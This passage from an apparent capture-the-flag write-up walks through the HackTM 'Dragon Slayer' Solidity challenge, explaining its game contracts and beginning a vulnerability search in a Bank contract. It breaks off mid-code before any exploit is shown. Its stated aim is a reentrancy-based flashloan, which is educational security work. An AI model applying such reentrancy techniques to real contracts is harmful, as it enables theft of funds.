<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>HackTM - Dragon Slayer - MevSec</title><meta name=Description content="A homemade flashloan using a reentrancy to kill this damn dragon!"><meta property="og:title" content="HackTM - Dragon Slayer"><meta property="og:description" content="A homemade flashloan using a reentrancy to kill this damn dragon!"><meta property="og:type" content="article"><meta property="og:url" content="/posts/hacktm-dragon-slayer/"><meta property="og:image" content="/posts/hacktm-dragon-slayer/dragonslayer.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-12T00:00:00+00:00"><meta property="article:modified_time" content="2023-03-12T00:00:00+00:00"><meta property="og:site_name" content="MevSec Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/posts/hacktm-dragon-slayer/dragonslayer.png"><meta name=twitter:title content="HackTM - Dragon Slayer"><meta name=twitter:description content="A homemade flashloan using a reentrancy to kill this damn dragon!"><meta name=application-name content="MevSec's blog"><meta name=apple-mobile-web-app-title content="MevSec's blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=/posts/hacktm-dragon-slayer/><link rel=prev href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/><link rel=next href=/posts/mevsec-introduction/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HackTM - Dragon Slayer","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"\/posts\/hacktm-dragon-slayer\/"},"image":[{"@type":"ImageObject","url":"\/posts\/hacktm-dragon-slayer\/dragonslayer.png","width":1703,"height":512}],"genre":"posts","keywords":"PoC, EVM, REEANTRANCY, ERC721, FLASHLOAN","wordcount":2622,"url":"\/posts\/hacktm-dragon-slayer\/","datePublished":"2023-03-12T00:00:00+00:00","dateModified":"2023-03-12T00:00:00+00:00","publisher":{"@type":"Organization","name":"Ethnical"},"author":{"@type":"Person","name":"Ethnical"},"description":"A homemade flashloan using a reentrancy to kill this damn dragon!"}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":""==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:""==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=MevSec>MevSec</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/categories/>Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=MevSec>MevSec</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/categories/ title>Categories</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTM - Dragon Slayer</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://twitter.com/EthnicalInfo title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Ethnical</a></span>&nbsp;<span class=post-category>included in <a href=/categories/web3/><i class="far fa-folder fa-fw" aria-hidden=true></i>Web3</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-03-12>2023-03-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;2622 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;13 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a><ul><li><a href=#1-dragon>1. Dragon</a></li><li><a href=#2-immunity-to-fire>2. Immunity to fire</a></li><li><a href=#3-fire-immunity-how-its-works>3. Fire Immunity how it‚Äôs works?</a></li><li><a href=#4-vulnerability-searching>4. Vulnerability Searching</a></li><li><a href=#5-homemade-flashloan>5. Homemade Flashloan</a></li><li><a href=#6-be-the-owner-of-an-nft>6. Be the owner of an NFT</a></li></ul></li><li><a href=#final-step>Final Step</a></li><li><a href=#socials--payload>Socials & Payload</a></li></ul></nav></div></div><div class=content id=content><h2 id=introduction>Introduction</h2><p>The <em><strong>19 February 2023</strong></em> the HackTM CTF has been launched.</p><p>The CTF has 2 smarts contract challenges. Both of them were on Solidity.</p><p>This writeup will cover the first challenge, <strong>Dragon Slayer</strong> the goal of the challenge is to kill the <em>Dragon</em>!</p><hr><p>Let‚Äôs download the challenges and see what we have here.<br>We have <u>9 contracts</u> describe as follow:</p><table><thead><tr><th>Contract Name</th><th>Purpose</th></tr></thead><tbody><tr><td>Bank</td><td>Bank permit to store the <code>GoldCoin</code> Also transfer <code>GoldCoin</code> to another bank account (using the bankNotes)</td></tr><tr><td>BankNote</td><td>An ERC721 (NFT) used to store the amount of <code>GoldCoin</code> deposited or transfered.</td></tr><tr><td>Dragon</td><td>The <code>Dragon</code> is the enemy we want to kill! The <code>Dragon</code> has health set <strong>1 000 000</strong>.</td></tr><tr><td>GoldCoin</td><td>The <code>ERC20</code> token this is the money of the game and can be used into the <code>Shop</code> to buy some <code>Item</code></td></tr><tr><td>Item</td><td>The <code>Item</code> that the <code>Knight</code> can equip like <code>Sword</code> or <code>Shield</code> (Items are stored in the store).</td></tr><tr><td>Knight</td><td>The <code>Knight</code> We are the <code>Knight</code>, we can attack the <code>Dragon</code>, also equip <code>Item</code> previously bought into the <code>Shop</code>, also deposit or withdraw money from the our <code>Bank</code> account. The health is set to 10 (Health of the <code>Knight</code>)</td></tr><tr><td>Setup</td><td>The <code>Setup</code> is the to create the contract and initialize the challenge (cf. Paradigm CTF or MevSec Challenge). This will create the <code>Knight</code> and give to the <code>Knight</code> (a bad quality <code>Sword</code> + <code>Shield</code> that make less damage) so there are not sufficient to fight the <code>Dragon</code>.</td></tr><tr><td>Shop</td><td>The <code>Shop</code> is the place where you can buy/sell <code>Item</code> used by the <code>Knight</code> (<code>Sword</code>, <code>Shield</code>). It&rsquo;s worth noting, inside the <code>Shop</code> there is 2 <code>Item</code>that are really powerful but extremely expensive (The currency of the <code>Shop</code> is <code>GoldCoin</code>)</td></tr></tbody></table><p>As usual the <code>setup.sol</code> permits to initialize the challenge so let‚Äôs see how the challenge is created ‚¨áÔ∏è</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>		<span class=k>function</span> isSolved<span class=o>()</span> external view returns <span class=o>(</span>bool<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> knight.health<span class=o>()</span> &gt; <span class=m>0</span> <span class=o>&amp;&amp;</span> knight.dragon<span class=o>()</span>.health<span class=o>()</span> <span class=o>==</span> 0<span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>The challenge will be solved when the <em><strong>health</strong></em> of the <code>Dragon</code> will be at <strong>0</strong> and the <code>Knight</code> is still alive!</p><p>Just to recap, this is a scheme to understand the challenge.<figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/Untitled.png title=Untitled data-thumbnail=/posts/hacktm-dragon-slayer/Untitled.png data-sub-html="<h2>Scheme of the challenge.</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled.png data-srcset="/posts/hacktm-dragon-slayer/Untitled.png, /posts/hacktm-dragon-slayer/Untitled.png 1.5x, /posts/hacktm-dragon-slayer/Untitled.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled.png width=1504 height=1248></a><figcaption class=image-caption>Scheme of the challenge.</figcaption></figure></p><p>Obviously, if we are trying to attack the dragon with the first equipment (<code>SWORD</code>, <code>SHIELD</code>) provided at the <strong>beginning</strong> by the creator, we will die instantly.</p><p><figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/Untitled%201.png title=Untitled data-thumbnail=/posts/hacktm-dragon-slayer/Untitled%201.png data-sub-html="<h2>Screenshot of the first weapons provided in the challenge.</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%201.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%201.png, /posts/hacktm-dragon-slayer/Untitled%201.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%201.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%201.png width=636 height=674></a><figcaption class=image-caption>Screenshot of the first weapons provided in the challenge.</figcaption></figure></p><p>Because the <strong>health</strong> of the dragon is <em>1_000_000</em> if we attack with the first <em>SWORD</em> we will only make <strong>1</strong> damage.. But the last <em>SWORD</em> of the <code>Shop</code> is extremely powerful but also extremely expensive!</p><p><figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/Untitled%202.png title=Untitled data-thumbnail=/posts/hacktm-dragon-slayer/Untitled%202.png data-sub-html="<h2>The last items of the SHOP, really powerful weapons (1m damage/defense).</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%202.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%202.png, /posts/hacktm-dragon-slayer/Untitled%202.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%202.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%202.png width=812 height=708></a><figcaption class=image-caption>The last items of the SHOP, really powerful weapons (1m damage/defense).</figcaption></figure></p><p>With this equipment we should succeed to kill the dragon ‚áí (1_000_000 Attack + 1_000_000 defense)</p><h3 id=1-dragon>1. Dragon</h3><p>The <code>Dragon</code> attack is extremely powerful (the minimum attack damage is the <em>clawAttack</em> of <strong>1 000 000</strong> damages).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=n>clawAttack</span> <span class=o>=</span> <span class=mi>1</span><span class=n>_000_000</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>fireAttack</span> <span class=o>=</span> <span class=mi>10</span><span class=n>_000_000</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>defence</span> <span class=o>=</span> <span class=mi>500</span><span class=n>_000</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>This will be used In the function <code>fightDragon()</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>function</span> fightDragon<span class=o>()</span> public onlyOwner onlyAlive <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=o>(</span>uint dragonDamage, bool isFire<span class=o>)</span> <span class=o>=</span> dragon.doAttack<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        _receiveAttack<span class=o>(</span>dragonDamage, isFire<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span>health &gt; 0<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            dragon.receiveAttack<span class=o>(</span>attack<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> _receiveAttack<span class=o>(</span>uint damage, bool isFire<span class=o>)</span> private <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span>isFire <span class=o>&amp;&amp;</span> hasAntiFire<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        uint damageDone<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span>damage &gt; defence<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>damageDone</span> <span class=o>=</span> damage - defence<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span>damageDone &gt; health<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>damageDone</span> <span class=o>=</span> health<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        health -<span class=o>=</span> damageDone<span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>When the <code>knight</code> is attacking the <code>dragon</code> by calling <code>fightDragon()</code></p><ul><li>The function will also trigger the attack of the <code>Dragon</code> because of the function calls <code>dragon.doAttack()</code>.</li></ul><p>If we are looking closely: Only if we survive (means the health of our <code>Knight</code>> <strong>0</strong>) the attack can make damage to the <code>Dragon</code>‚Ä¶</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%203.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%203.png, /posts/hacktm-dragon-slayer/Untitled%203.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%203.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%203.png title=Untitled width=752 height=178></p><p>However, the <code>dragon</code> is too powerful (1_000_000 damage with the <em>clawAttack</em>) and will one shot our knight after during our first attack‚Ä¶ <em>But not always!</em></p><h3 id=2-immunity-to-fire>2. Immunity to fire</h3><p>Inside the <code>if</code> statement, we can clearly see that the attack of the <code>dragon</code> is reducing our health in the code inside the red rectangle.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%204.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%204.png, /posts/hacktm-dragon-slayer/Untitled%204.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%204.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%204.png title=Untitled width=920 height=490></p><p>But the first <code>if</code>, permits to bypass the damage from the <code>dragon</code>! (<em>this is the immunity to fire</em>). So inside this block the return be call before updating anything and will not reduce the health of the <code>Knight</code>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%205.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%205.png, /posts/hacktm-dragon-slayer/Untitled%205.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%205.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%205.png title=Untitled width=1074 height=494></p><h3 id=3-fire-immunity-how-its-works>3. Fire Immunity how it‚Äôs works?</h3><p>The <code>hasAntiFire</code> boolean attribut is only on the last <em>SHIELD</em> of the shop (the best <em>SHIELD that cost 1_000_000 ether</em>). If we got the last <em>SHIELD</em> equiped on our <code>knight</code> then we can call<code>fightDragon()</code> until the <code>dragon</code> is dead (<em>because we will be immune to fire and make 1 damage each call right?</em>)</p><p>No actually‚Ä¶ Because the <code>dragon</code> will change of attack every 5 attacks he will use the <em>clawAttack</em> and oneshot our <code>knight</code>‚Ä¶ So we need to kill him faster than 5 attacks‚Ä¶ Hopefully, the two last <code>Items</code> of the <code>shop</code> permits to kill the dragon faster than the 5 attacks maximal :</p><table><thead><tr><th>Items</th><th>Specifications</th><th>Cost in GoldCoin</th></tr></thead><tbody><tr><td>Sword (Abyssal Whip)</td><td>1_000_000 damages</td><td>1_000_000 GoldCoin</td></tr><tr><td>Shield (Dragonfire Shield)</td><td>1_000_000 defense + immune to Fire Attack (perfect!)</td><td>1_000_000 GoldCoin</td></tr></tbody></table><p>So this is perfect we have a plan of attack to kill the dragon but wait a minutes?</p><p>The <code>knight</code> has only <strong>10</strong> <code>GoldCoin</code>‚Ä¶.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%206.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%206.png, /posts/hacktm-dragon-slayer/Untitled%206.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%206.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%206.png title=Untitled width=428 height=46></p><p>So, the goal of the challenge is to find a way to <strong>get the enough money</strong> to <strong>buy</strong> both of the equipments (<em>SHIELD</em>, <em>SWORD</em>) and fight the <code>dragon</code>.</p><hr><h3 id=4-vulnerability-searching>4. Vulnerability Searching</h3><p>So to start to find an entry point to exploit the challenge we should start by the contracts that manipulated the <code>GoldCoin</code> as we know this will be probably related to the <strong>money</strong> of the game, because we need to have 2_000_000 <code>GoldCoin</code></p><p>‚áí A interesting contract related to the <code>GoldCoin</code> is the <code>bank</code> üí∞¬†contract .</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>// SPDX-License-Identifier: MIT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pragma solidity ^0.8.13<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>import <span class=s2>&#34;./openzeppelin-contracts/utils/Counters.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>import <span class=s2>&#34;./GoldCoin.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>import <span class=s2>&#34;./BankNote.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>contract Bank <span class=o>{</span>
</span></span><span class=line><span class=cl>    using Counters <span class=k>for</span> Counters.Counter<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    uint constant <span class=nv>INITIAL_AMOUNT</span> <span class=o>=</span> <span class=m>10</span> ether<span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    Counters.Counter private _ids<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    GoldCoin public goldCoin<span class=p>;</span>
</span></span><span class=line><span class=cl>    BankNote public bankNote<span class=p>;</span>
</span></span><span class=line><span class=cl>    mapping<span class=o>(</span><span class=nv>uint</span> <span class=o>=</span>&gt; uint<span class=o>)</span> public bankNoteValues<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    constructor<span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>goldCoin</span> <span class=o>=</span> new GoldCoin<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>bankNote</span> <span class=o>=</span> new BankNote<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        goldCoin.mint<span class=o>(</span>msg.sender, INITIAL_AMOUNT<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> deposit<span class=o>(</span>uint amount<span class=o>)</span> external <span class=o>{</span>
</span></span><span class=line><span class=cl>        require<span class=o>(</span>amount &gt; 0, <span class=s2>&#34;ZERO&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        goldCoin.burn<span class=o>(</span>msg.sender, amount<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        _ids.increment<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        uint <span class=nv>bankNoteId</span> <span class=o>=</span> _ids.current<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        bankNote.mint<span class=o>(</span>msg.sender, bankNoteId<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        bankNoteValues<span class=o>[</span>bankNoteId<span class=o>]</span> <span class=o>=</span> amount<span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> withdraw<span class=o>(</span>uint bankNoteId<span class=o>)</span> external <span class=o>{</span>
</span></span><span class=line><span class=cl>        require<span class=o>(</span>bankNote.ownerOf<span class=o>(</span>bankNoteId<span class=o>)</span> <span class=o>==</span> msg.sender, <span class=s2>&#34;NOT_OWNER&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        bankNote.burn<span class=o>(</span>bankNoteId<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        goldCoin.mint<span class=o>(</span>msg.sender, bankNoteValues<span class=o>[</span>bankNoteId<span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        bankNoteValues<span class=o>[</span>bankNoteId<span class=o>]</span> <span class=o>=</span> 0<span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> merge<span class=o>(</span>uint<span class=o>[]</span> memory bankNoteIdsFrom<span class=o>)</span> external <span class=o>{</span>
</span></span><span class=line><span class=cl>        uint totalValue<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=o>(</span>uint <span class=nv>i</span> <span class=o>=</span> 0<span class=p>;</span> i &lt; bankNoteIdsFrom.length<span class=p>;</span> i++<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            uint <span class=nv>bankNoteId</span> <span class=o>=</span> bankNoteIdsFrom<span class=o>[</span>i<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            require<span class=o>(</span>bankNote.ownerOf<span class=o>(</span>bankNoteId<span class=o>)</span> <span class=o>==</span> msg.sender, <span class=s2>&#34;NOT_OWNER&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            bankNote.burn<span class=o>(</span>bankNoteId<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>totalValue</span> <span class=o>+=</span> bankNoteValues<span class=o>[</span>bankNoteId<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            bankNoteValues<span class=o>[</span>bankNoteId<span class=o>]</span> <span class=o>=</span> 0<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        _ids.increment<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        uint <span class=nv>bankNoteIdTo</span> <span class=o>=</span> _ids.current<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        bankNote.mint<span class=o>(</span>msg.sender, bankNoteIdTo<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        bankNoteValues<span class=o>[</span>bankNoteIdTo<span class=o>]</span> +<span class=o>=</span> totalValue<span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> split<span class=o>(</span>uint bankNoteIdFrom, uint<span class=o>[]</span> memory amounts<span class=o>)</span> external <span class=o>{</span>
</span></span><span class=line><span class=cl>        uint totalValue<span class=p>;</span>
